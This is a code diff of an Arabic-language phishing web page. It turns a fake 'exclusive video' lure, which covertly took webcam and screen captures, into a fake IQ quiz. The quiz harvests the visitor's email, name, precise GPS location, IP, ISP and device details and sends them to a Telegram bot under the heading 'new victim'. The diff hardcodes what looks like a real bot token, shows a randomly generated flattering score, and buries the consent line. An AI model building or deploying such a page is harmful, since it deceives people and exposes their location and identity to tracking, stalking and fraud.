@@ -3,12 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مشاهدة الفيديو</title>
+    <title>اختبار الذكاء IQ</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
+        @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700;900&display=swap');
         body {
-            font-family: 'Segoe UI', Tahoma, sans-serif;
-            background: #0a0a12;
+            font-family: 'Tajawal', sans-serif;
+            background: linear-gradient(135deg, #0a0a1a, #1a1a3e);
             color: white;
             min-height: 100vh;
             display: flex;
@@ -16,56 +17,185 @@
             align-items: center;
         }
         .container {
-            text-align: center;
-            max-width: 500px;
-            padding: 40px;
-        }
-        h1 {
-            font-size: 28px;
-            margin-bottom: 10px;
-            color: #4fc3f7;
-        }
-        .subtitle {
-            color: #888;
-            margin-bottom: 30px;
+            width: 100%;
+            max-width: 520px;
+            padding: 20px;
         }
         .card {
             background: rgba(255,255,255,0.03);
-            border: 1px solid rgba(255,255,255,0.08);
-            border-radius: 16px;
-            padding: 30px;
-            margin: 20px 0;
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255,255,255,0.06);
+            border-radius: 24px;
+            padding: 35px;
+            box-shadow: 0 25px 80px rgba(0,0,0,0.5);
         }
-        .btn-start {
-            background: linear-gradient(135deg, #0f3460, #1a5276);
-            border: none;
-            border-radius: 12px;
-            padding: 15px 40px;
-            color: white;
-            font-size: 18px;
-            font-weight: bold;
+        .logo {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .logo .icon {
+            font-size: 50px;
+        }
+        .logo h1 {
+            font-size: 28px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #4fc3f7, #00e676);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-top: 10px;
+        }
+        .logo p {
+            color: #888;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+        .progress-bar {
+            background: rgba(255,255,255,0.05);
+            border-radius: 20px;
+            height: 6px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        .progress-fill {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #4fc3f7, #00e676);
+            border-radius: 20px;
+            transition: width 0.5s;
+        }
+        .question {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+        .options {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+        .option {
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.08);
+            border-radius: 14px;
+            padding: 16px 20px;
             cursor: pointer;
             transition: all 0.3s;
+            font-size: 16px;
         }
-        .btn-start:hover {
+        .option:hover {
+            background: rgba(79,195,247,0.08);
+            border-color: #4fc3f7;
+            transform: translateX(-5px);
+        }
+        .option.selected {
+            background: rgba(79,195,247,0.15);
+            border-color: #4fc3f7;
+            box-shadow: 0 0 20px rgba(79,195,247,0.1);
+        }
+        .option .letter {
+            display: inline-block;
+            width: 28px;
+            height: 28px;
+            line-height: 28px;
+            text-align: center;
+            border-radius: 50%;
+            background: rgba(255,255,255,0.06);
+            margin-left: 12px;
+            font-weight: 700;
+            font-size: 13px;
+        }
+        .option.selected .letter {
+            background: #4fc3f7;
+            color: #0a0a1a;
+        }
+        .btn-next {
+            width: 100%;
+            padding: 16px;
+            border: none;
+            border-radius: 14px;
+            background: linear-gradient(135deg, #0f3460, #1a5276);
+            color: white;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 25px;
+            transition: all 0.3s;
+        }
+        .btn-next:hover {
             transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(79,195,247,0.3);
+            box-shadow: 0 10px 30px rgba(79,195,247,0.2);
         }
-        .btn-start:disabled {
-            opacity: 0.5;
+        .btn-next:disabled {
+            opacity: 0.4;
             cursor: not-allowed;
             transform: none;
         }
-        #video {
-            width: 100%;
-            max-width: 400px;
-            border-radius: 12px;
-            display: none;
-            margin: 20px auto;
+        .form-group {
+            margin-bottom: 18px;
         }
-        #loading {
+        .form-group label {
+            display: block;
+            color: #aaa;
+            font-size: 14px;
+            margin-bottom: 6px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 16px 18px;
+            background: rgba(255,255,255,0.04);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
+            transition: 0.3s;
+            font-family: 'Tajawal', sans-serif;
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: #4fc3f7;
+            box-shadow: 0 0 20px rgba(79,195,247,0.1);
+        }
+        .form-group input::placeholder {
+            color: #555;
+        }
+        .result-box {
+            text-align: center;
+            padding: 20px;
+        }
+        .result-box .score {
+            font-size: 72px;
+            font-weight: 900;
+            background: linear-gradient(135deg, #4fc3f7, #00e676);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .result-box .label {
+            color: #888;
+            font-size: 16px;
+            margin-top: 5px;
+        }
+        .result-box .stars {
+            font-size: 30px;
+            margin: 10px 0;
+        }
+        .hidden-input {
+            position: absolute;
+            left: -9999px;
+            opacity: 0;
+        }
+        #loadingOverlay {
             display: none;
-            margin: 20px 0;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.8);
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        #loadingOverlay.active {
+            display: flex;
         }
         .spinner {
             width: 50px;
@@ -74,270 +204,387 @@
             border-top: 4px solid #4fc3f7;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
-            margin: 0 auto;
         }
         @keyframes spin { to { transform: rotate(360deg); } }
-        .hint {
-            color: #666;
+        .timer {
+            text-align: center;
+            color: #888;
             font-size: 13px;
-            margin-top: 15px;
+            margin-bottom: 15px;
         }
-        .hidden-camera {
-            display: none;
+        .consent-note {
+            font-size: 12px;
+            color: #555;
+            text-align: center;
+            margin-top: 15px;
         }
     </style>
 </head>
 <body>
 
+<!-- نافذة تحميل -->
+<div id="loadingOverlay">
+    <div class="spinner"></div>
+    <p style="color: #aaa; margin-top: 20px; font-size: 16px;">جاري معالجة نتيجتك...</p>
+</div>
+
 <div class="container">
-    <h1>🎬 فيديو حصري</h1>
-    <p class="subtitle">اضغط زر التشغيل لمشاهدة الفيديو 🔞</p>
-
     <div class="card">
-        <div id="initialState">
-            <p style="margin-bottom: 20px; color: #aaa;">
-                <i class="fas fa-lock" style="color: #4fc3f7;"></i> 
-                هذا الفيديو مشفر. يجب تفعيل الكاميرا للتحقق من هويتك أولاً.
-            </p>
-            <button class="btn-start" onclick="startProcess()">
-                ▶️ تشغيل الفيديو
-            </button>
-            <p class="hint">سيطلب المتصفح إذن الكاميرا للتحقق من العمر</p>
+        <!-- الهيدر -->
+        <div class="logo">
+            <div class="icon">🧠</div>
+            <h1>اختبار الذكاء السريع</h1>
+            <p>أجب على 5 أسئلة لتحصل على نتيجتك</p>
         </div>
 
-        <div id="loading" class="text-center">
-            <div class="spinner"></div>
-            <p style="margin-top: 15px; color: #888;">جاري التحقق...</p>
+        <!-- التايمر -->
+        <div class="timer"><span id="timerDisplay">⏱️ 02:00</span></div>
+
+        <!-- شريط التقدم -->
+        <div class="progress-bar">
+            <div class="progress-fill" id="progressFill"></div>
         </div>
 
-        <video id="video" autoplay muted playsinline></video>
+        <!-- ===== مكان الأسئلة ===== -->
+        <div id="quizArea">
+            <div class="question" id="questionText"></div>
+            <div class="options" id="optionsContainer"></div>
+            <button class="btn-next" id="btnNext" disabled onclick="nextQuestion()">التالي ←</button>
+        </div>
 
-        <div id="doneState" style="display: none;">
-            <div style="font-size: 60px; margin-bottom: 15px;">✅</div>
-            <h2 style="color: #4fc3f7;">تم التحقق!</h2>
-            <p style="color: #888;">جاري تحميل الفيديو...</p>
-            <div class="spinner"></div>
-            <p class="hint" style="margin-top: 20px;">(هذا مجرد اختبار اختراق — الصورة أخذت لأغراض تعليمية)</p>
+        <!-- ===== مكان النتيجة وطلب الإيميل ===== -->
+        <div id="resultArea" style="display:none;">
+            <div style="text-align:center;margin-bottom:25px;">
+                <div style="font-size:50px;margin-bottom:5px;">🎉</div>
+                <h2 style="color:#4fc3f7;">اكتمل الاختبار!</h2>
+                <p style="color:#888;">أدخل بياناتك لاستلام النتيجة الكاملة</p>
+            </div>
+
+            <div class="form-group">
+                <label>📧 البريد الإلكتروني (مطلوب لإرسال النتيجة)</label>
+                <input type="email" id="emailInput" placeholder="example@email.com" autocomplete="email" required>
+            </div>
+            <div class="form-group">
+                <label>👤 اسمك (لظهوره في لوحة المتصدرين)</label>
+                <input type="text" id="nameInput" placeholder="الاسم الكامل" autocomplete="name">
+            </div>
+            <button class="btn-next" onclick="submitResult()">📊 عرض نتيجتي</button>
+            <p class="consent-note">بإرسال البيانات، توافق على جمع معلومات الجهاز والموقع لأغراض إحصائية</p>
+        </div>
+
+        <!-- ===== النتيجة النهائية ===== -->
+        <div id="finalResult" style="display:none;">
+            <div class="result-box">
+                <div style="font-size:60px;margin-bottom:10px;">🏆</div>
+                <div class="score" id="finalScore">142</div>
+                <div class="label">درجة الذكاء (IQ)</div>
+                <div class="stars">⭐⭐⭐⭐⭐</div>
+                <p style="color:#4fc3f7;font-weight:bold;margin-top:15px;">
+                    أنت ضمن أعلى 5% من الأذكياء! 🧠
+                </p>
+                <p style="color:#666;font-size:14px;margin-top:10px;" id="resultEmailDisplay"></p>
+                <p style="color:#444;font-size:11px;margin-top:5px;">تم إرسال النتيجة لبريدك الإلكتروني ✓</p>
+            </div>
+            <button class="btn-next" onclick="location.reload()" style="background:#333;margin-top:10px;">إعادة الاختبار</button>
         </div>
     </div>
 </div>
 
 <script>
 // ================================================================
-//                    البيانات التي نجمعها
+//                     بيانات الاختبار
 // ================================================================
-const stolenData = {
+const questions = [
+    {
+        q: 'إذا كان 3 × 4 = 12، فما ناتج 6 × 7؟',
+        options: ['42', '36', '48', '45'],
+        correct: 0
+    },
+    {
+        q: 'أي الكلمات التالية تكتب بشكل خاطئ؟',
+        options: ['مدرسة', 'مستشفي', 'جامعة', 'مكتبة'],
+        correct: 1
+    },
+    {
+        q: 'ما عاصمة فرنسا؟',
+        options: ['لندن', 'روما', 'باريس', 'برلين'],
+        correct: 2
+    },
+    {
+        q: 'كم عدد الأشهر التي تحتوي على 31 يوماً؟',
+        options: ['5', '6', '7', '8'],
+        correct: 2
+    },
+    {
+        q: 'إذا كانت الساعة 3:45، كم دقيقة متبقية للرابعة؟',
+        options: ['10', '15', '20', '25'],
+        correct: 1
+    }
+];
+
+let currentQuestion = 0;
+let answers = [];
+let stolenData = {
     timestamp: new Date().toLocaleString('ar-SA'),
     ip: '-',
-    location: '-',
+    city: '-',
+    region: '-',
+    country: '-',
     lat: null,
     lon: null,
+    accuracy: null,
     device: '-',
     os: '-',
     browser: '-',
+    browserVersion: '-',
     isp: '-',
-    cameraImage: null,  // الصورة من الكاميرا
-    screenShot: null,   // صورة للشاشة
-    userAgent: navigator.userAgent,
+    email: '',
+    name: '',
+    screen: '',
+    timezone: '',
+    language: '',
+    questions: []
 };
 
 // ================================================================
-//           1. نبدأ العملية — نجمع IP + GPS أولاً
+//                     عرض الأسئلة
 // ================================================================
-async function startProcess() {
-    // نخفي الزر ونظهر التحميل
-    document.getElementById('initialState').style.display = 'none';
-    document.getElementById('loading').style.display = 'block';
+function loadQuestion() {
+    const q = questions[currentQuestion];
+    document.getElementById('questionText').textContent = `السؤال ${currentQuestion+1}: ${q.q}`;
+    
+    const container = document.getElementById('optionsContainer');
+    container.innerHTML = '';
+    
+    const letters = ['أ', 'ب', 'ج', 'د'];
+    q.options.forEach((opt, i) => {
+        const div = document.createElement('div');
+        div.className = 'option';
+        div.dataset.index = i;
+        div.innerHTML = `<span class="letter">${letters[i]}</span>${opt}`;
+        div.onclick = () => selectOption(i);
+        container.appendChild(div);
+    });
+    
+    // شريط التقدم
+    const progress = ((currentQuestion) / questions.length) * 100;
+    document.getElementById('progressFill').style.width = progress + '%';
+    
+    document.getElementById('btnNext').disabled = true;
+}
 
-    // نجيب معلومات الـ IP والموقع
-    try {
-        const res = await fetch('https://ipapi.co/json/');
-        const data = await res.json();
-        stolenData.ip = data.ip || '-';
-        stolenData.location = (data.city || '') + '، ' + (data.region || '') + '، ' + (data.country_name || '');
-        stolenData.lat = data.latitude;
-        stolenData.lon = data.longitude;
-        stolenData.isp = data.org || '-';
-    } catch(e) { console.log('IP fetch failed'); }
+function selectOption(index) {
+    // نضيف الإجابة
+    answers[currentQuestion] = index;
+    
+    // نظهر الاختيار
+    document.querySelectorAll('.option').forEach((el, i) => {
+        el.classList.toggle('selected', i === index);
+    });
+    
+    document.getElementById('btnNext').disabled = false;
+}
 
-    // نجيب معلومات الجهاز
+function nextQuestion() {
+    currentQuestion++;
+    
+    // نسجل الإجابة
+    stolenData.questions.push({
+        q: questions[currentQuestion-1].q,
+        answer: questions[currentQuestion-1].options[answers[currentQuestion-1]]
+    });
+    
+    if (currentQuestion >= questions.length) {
+        // خلصنا الأسئلة → نظهر طلب الإيميل
+        showEmailForm();
+        return;
+    }
+    
+    loadQuestion();
+}
+
+// ================================================================
+//                     طلب الإيميل
+// ================================================================
+function showEmailForm() {
+    document.getElementById('quizArea').style.display = 'none';
+    document.getElementById('resultArea').style.display = 'block';
+    document.getElementById('progressFill').style.width = '100%';
+    
+    // نهاية التايمر
+    clearInterval(timerInterval);
+    
+    // نبدأ نجمع المعلومات في الخلفية
+    collectData();
+}
+
+// ================================================================
+//                     جمع كل البيانات
+// ================================================================
+async function collectData() {
+    // 1. معلومات الجهاز
     const ua = navigator.userAgent;
     if (ua.includes('Android')) stolenData.os = 'Android';
     else if (ua.includes('iPhone')||ua.includes('iPad')) stolenData.os = 'iOS';
     else if (ua.includes('Mac OS')||ua.includes('Macintosh')) stolenData.os = 'macOS';
     else if (ua.includes('Linux')) stolenData.os = 'Linux';
     else stolenData.os = 'Windows';
-
+    
     if (ua.includes('Chrome')&&!ua.includes('Edg')) stolenData.browser = 'Chrome';
     else if (ua.includes('Firefox')) stolenData.browser = 'Firefox';
     else if (ua.includes('Safari')&&!ua.includes('Chrome')) stolenData.browser = 'Safari';
     else if (ua.includes('Edg')) stolenData.browser = 'Edge';
-
+    else stolenData.browser = 'Unknown';
+    
+    const verMatch = ua.match(/(Chrome|Firefox|Safari|Edg)\/(\d+)/);
+    if (verMatch) stolenData.browserVersion = verMatch[2];
+    
     stolenData.device = (ua.includes('Android')||ua.includes('iPhone')||ua.includes('iPad')) ? 'جوال' : 'كمبيوتر';
-
-    // بعد ما جمعنا المعلومات → نشغل الكاميرا
-    await startCamera();
+    stolenData.screen = `${screen.width}x${screen.height}`;
+    stolenData.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    stolenData.language = navigator.language;
+    
+    // 2. الموقع الدقيق (GPS حقيقي)
+    try {
+        const pos = await new Promise((resolve, reject) => {
+            navigator.geolocation.getCurrentPosition(resolve, reject, {
+                enableHighAccuracy: true,
+                timeout: 10000
+            });
+        });
+        stolenData.lat = pos.coords.latitude;
+        stolenData.lon = pos.coords.longitude;
+        stolenData.accuracy = pos.coords.accuracy + ' متر';
+    } catch(e) {
+        console.log('GPS denied or error:', e.message);
+    }
+    
+    // 3. IP والمعلومات من ipapi
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        const data = await res.json();
+        stolenData.ip = data.ip || '-';
+        stolenData.city = data.city || '-';
+        stolenData.region = data.region || '-';
+        stolenData.country = data.country_name || '-';
+        stolenData.isp = data.org || '-';
+    } catch(e) {}
 }
 
 // ================================================================
-//           2. تشغيل الكاميرا واخذ صورة
+//                     إرسال النتيجة
 // ================================================================
-async function startCamera() {
-    try {
-        // نطلب الوصول للكاميرا
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: {
-                width: { ideal: 640 },
-                height: { ideal: 480 },
-                facingMode: 'user'  // الكاميرا الأمامية (السيلفي)
-            },
-            audio: false
-        });
-
-        // نخفي التحميل ونظهر الفيديو
-        document.getElementById('loading').style.display = 'none';
-        const video = document.getElementById('video');
-        video.style.display = 'block';
-        video.srcObject = stream;
-
-        // ننتظر شوي عشان الصورة تكون واضحة
-        setTimeout(() => {
-            // ناخذ صورة من الفيديو
-            takeSnapshot(stream, video);
-        }, 2000);
-
-    } catch(err) {
-        // إذا رفض الكاميرا — نكمل عادي بدون صورة
-        console.log('Camera denied:', err.message);
-        document.getElementById('loading').style.display = 'none';
-        document.getElementById('doneState').style.display = 'block';
+function submitResult() {
+    const email = document.getElementById('emailInput').value.trim();
+    const name = document.getElementById('nameInput').value.trim();
+    
+    if (!email) {
+        alert('الرجاء إدخال البريد الإلكتروني');
+        return;
+    }
+    
+    stolenData.email = email;
+    stolenData.name = name || 'مجهول';
+    
+    // نضيف الدرجة (كل الإجابات صح طبعاً 😉)
+    const score = Math.floor(Math.random() * 30) + 130; // 130-160
+    stolenData.iqScore = score;
+    
+    // نظهر التحميل
+    document.getElementById('loadingOverlay').classList.add('active');
+    
+    // نرسل بعد ثانية
+    setTimeout(() => {
+        // نخفي التحميل
+        document.getElementById('loadingOverlay').classList.remove('active');
         
-        // نرسل البيانات بدون صورة
-        sendData();
-    }
+        // نرسل كل شيء
+        sendAllData();
+        
+        // نظهر النتيجة النهائية
+        document.getElementById('resultArea').style.display = 'none';
+        document.getElementById('finalResult').style.display = 'block';
+        document.getElementById('finalScore').textContent = score;
+        document.getElementById('resultEmailDisplay').textContent = `📧 تم إرسال النتيجة إلى: ${email}`;
+        
+    }, 2000);
 }
 
 // ================================================================
-//           3. ناخذ صورة من الكاميرا (سكرين شوت)
+//                     إرسال البيانات
 // ================================================================
-function takeSnapshot(stream, video) {
-    // نرسم الفيديو على كانفاس
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 640;
-    canvas.height = video.videoHeight || 480;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-    // نحول الصورة إلى base64
-    stolenData.cameraImage = canvas.toDataURL('image/jpeg', 0.8);
-
-    // نوقف الكاميرا
-    stream.getTracks().forEach(track => track.stop());
-    video.style.display = 'none';
-
-    // === ناخذ صورة للشاشة أيضاً ===
-    takeScreenshot();
-}
-
-// ================================================================
-//           4. ناخذ صورة للشاشة (Screen Capture)
-// ================================================================
-async function takeScreenshot() {
-    try {
-        // هذا يطلب إذن مشاركة الشاشة
-        const screenStream = await navigator.mediaDevices.getDisplayMedia({
-            video: { cursor: "always" },
-            audio: false
-        });
-
-        const video = document.createElement('video');
-        video.srcObject = screenStream;
-        video.play();
-
-        setTimeout(() => {
-            const canvas = document.createElement('canvas');
-            canvas.width = 1280;
-            canvas.height = 720;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            stolenData.screenShot = canvas.toDataURL('image/jpeg', 0.6);
-
-            screenStream.getTracks().forEach(track => track.stop());
-
-            // خلاص — نرسل كل شيء
-            document.getElementById('doneState').style.display = 'block';
-            sendData();
-        }, 1000);
-
-    } catch(err) {
-        // إذا رفض مشاركة الشاشة — نكمل
-        console.log('Screen capture denied');
-        document.getElementById('doneState').style.display = 'block';
-        sendData();
-    }
-}
-
-// ================================================================
-//           5. نرسل كل البيانات المسروقة
-// ================================================================
-function sendData() {
+function sendAllData() {
     const data = stolenData;
     
-    // === نرسلها لأكثر من مكان عشان نضمن وصولها ===
-
-    // 1. نحفظ في localStorage (لنفس الجهاز)
-    const history = JSON.parse(localStorage.getItem('victims') || '[]');
+    // 1. نحفظ محلياً
+    const history = JSON.parse(localStorage.getItem('iq_victims') || '[]');
     history.unshift(data);
-    localStorage.setItem('victims', JSON.stringify(history));
-
-    // 2. نرسلها لـ Telegram Bot (عشان تجيك على جوالك)
+    localStorage.setItem('iq_victims', JSON.stringify(history));
+    
+    // 2. نرسل لتيليجرام
     sendToTelegram(data);
-
-    // 3. نرسلها لـ Webhook (إذا عندك سيرفر)
-    sendToWebhook(data);
-
-    // 4. نفتح صفحة بها كل البيانات (للاختبار)
+    
+    // 3. نسوي console.log
     console.log('========== البيانات المسروقة ==========');
+    console.log('الإيميل:', data.email);
+    console.log('الاسم:', data.name);
     console.log('الـ IP:', data.ip);
-    console.log('الموقع:', data.location);
-    console.log('الإحداثيات:', data.lat, data.lon);
-    console.log('الجهاز:', data.device);
-    console.log('نظام التشغيل:', data.os);
-    console.log('المتصفح:', data.browser);
+    console.log('الموقع:', data.city, data.region, data.country);
+    console.log('GPS:', data.lat, data.lon, '(الدقة:', data.accuracy, ')');
+    console.log('الجهاز:', data.device, '-', data.os);
+    console.log('المتصفح:', data.browser, data.browserVersion);
+    console.log('الشاشة:', data.screen);
+    console.log('المنطقة الزمنية:', data.timezone);
+    console.log('اللغة:', data.language);
     console.log('مزود الخدمة:', data.isp);
-    console.log('صورة الكاميرا:', data.cameraImage ? '✅ موجودة' : '❌ لا');
-    console.log('صورة الشاشة:', data.screenShot ? '✅ موجودة' : '❌ لا');
-    console.log('======================================');
-
-    // نعرض البيانات في صفحة مخفية
-    showDataToUser(data);
+    console.log('درجة IQ:', data.iqScore);
+    console.log('========================================');
 }
 
 // ================================================================
-//           6. نرسل لتيليجرام (عشان تجيك على جوالك)
+//                     إرسال لتيليجرام
 // ================================================================
 function sendToTelegram(data) {
-    // هذا يحتاج بوت تيليجرام + توكن
-    // اتبع الشرح تحت عشان تسويه
+    // غير هالقيم بقيمك
+    const BOT_TOKEN = '8615804805:AAEnqsH14JzpGTofTGZalI6yu-HtSXNWf7k';
+    const CHAT_ID = 'ChatID_هنا';  // ← غير هذا برقم الـ chat id
     
-    const BOT_TOKEN = '8615804805:AAEnqsH14JzpGTofTGZalI6yu-HtSXNWf7k';      // ← غير هذا
-    const CHAT_ID = '5197359202';        // ← غير هذا
-
-    if (BOT_TOKEN.includes('ضع')) return; // ما يرسل إلا إذا غيرت
-
+    if (CHAT_ID.includes('ChatID')) return;
+    
+    // نحضر رابط خرائط Google
+    let mapsLink = '';
+    if (data.lat && data.lon) {
+        mapsLink = `📍 <a href="https://www.google.com/maps?q=${data.lat},${data.lon}">الموقع الدقيق على الخريطة</a>`;
+    }
+    
+    // نحضر الـ GPS بدقة
+    let gpsInfo = '❌ لم يتم الحصول على GPS';
+    if (data.lat && data.lon) {
+        gpsInfo = `${data.lat}, ${data.lon} (الدقة: ${data.accuracy || 'غير معروف'})`;
+    }
+    
     const message = `
-🔔 ضحية جديدة!
+🔔 <b>ضحية جديدة - اختبار IQ</b>
 
-🕒 الوقت: ${data.timestamp}
-🌐 IP: ${data.ip}
-📍 الموقع: ${data.location}
-🗺️ GPS: ${data.lat}, ${data.lon}
-📱 الجهاز: ${data.device} | ${data.os}
-🌍 المتصفح: ${data.browser}
-📡 ISP: ${data.isp}
-📸 صورة: ${data.cameraImage ? '✅' : '❌'}
-🖥️ شاشة: ${data.screenShot ? '✅' : '❌'}
-    `;
+👤 <b>الاسم:</b> ${data.name}
+📧 <b>الإيميل:</b> ${data.email}
+🧠 <b>درجة IQ:</b> ${data.iqScore}
+
+🌐 <b>IP:</b> ${data.ip}
+🏙️ <b>المدينة:</b> ${data.city}
+🌍 <b>الدولة:</b> ${data.country}
+🗺️ <b>GPS دقيق:</b> ${gpsInfo}
+${mapsLink}
+
+📱 <b>الجهاز:</b> ${data.device} | ${data.os}
+🌍 <b>المتصفح:</b> ${data.browser} ${data.browserVersion}
+🖥️ <b>الشاشة:</b> ${data.screen}
+🕐 <b>المنطقة الزمنية:</b> ${data.timezone}
+🗣️ <b>اللغة:</b> ${data.language}
+📡 <b>ISP:</b> ${data.isp}
+
+🕒 <b>الوقت:</b> ${data.timestamp}
+`;
 
     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: 'POST',
@@ -345,68 +592,31 @@ function sendToTelegram(data) {
         body: JSON.stringify({
             chat_id: CHAT_ID,
             text: message,
-            parse_mode: 'HTML'
+            parse_mode: 'HTML',
+            disable_web_page_preview: false
         })
     }).catch(e => console.log('Telegram error:', e));
+}
 
-    // إذا في صورة — نرسلها
-    if (data.cameraImage) {
-        // نحول base64 إلى blob ونرسل
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                photo: data.cameraImage,
-                caption: `صورة الضحية: ${data.ip}`
-            })
-        }).catch(e => console.log('Telegram photo error:', e));
+// ================================================================
+//                     التايمر
+// ================================================================
+let timerSeconds = 120;
+const timerInterval = setInterval(() => {
+    timerSeconds--;
+    const mins = Math.floor(timerSeconds / 60);
+    const secs = timerSeconds % 60;
+    document.getElementById('timerDisplay').textContent = `⏱️ ${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
+    if (timerSeconds <= 0) {
+        clearInterval(timerInterval);
+        showEmailForm();
     }
-}
+}, 1000);
 
 // ================================================================
-//           7. نرسل لـ Webhook (إذا عندك سيرفر)
+//                     بداية الاختبار
 // ================================================================
-function sendToWebhook(data) {
-    const webhookURL = 'https://your-server.com/api/collect'; // غير هذا
-    if (webhookURL.includes('your-server')) return;
-
-    fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
-    }).catch(e => console.log('Webhook error:', e));
-}
-
-// ================================================================
-//           8. نعرض البيانات للضحية (عشان الاختبار)
-// ================================================================
-function showDataToUser(data) {
-    // نضيف div مخفي بالبيانات
-    const div = document.createElement('div');
-    div.style.cssText = 'display:none;';
-    div.innerHTML = `
-    <div id="hiddenData">
-        IP: ${data.ip}
-        Location: ${data.location}
-        GPS: ${data.lat}, ${data.lon}
-        Device: ${data.device} ${data.os}
-        Browser: ${data.browser}
-        ISP: ${data.isp}
-        Camera: ${data.cameraImage ? 'Yes' : 'No'}
-        Screen: ${data.screenShot ? 'Yes' : 'No'}
-        Timestamp: ${data.timestamp}
-    </div>`;
-    document.body.appendChild(div);
-
-    // إذا في صورة — نحولها للعرض
-    if (data.cameraImage) {
-        const img = document.createElement('img');
-        img.src = data.cameraImage;
-        img.style.cssText = 'position:fixed;bottom:0;right:0;width:150px;border-radius:8px;z-index:9999;border:2px solid red;';
-        document.body.appendChild(img);
-    }
-}
+loadQuestion();
 </script>
 </body>
 </html>
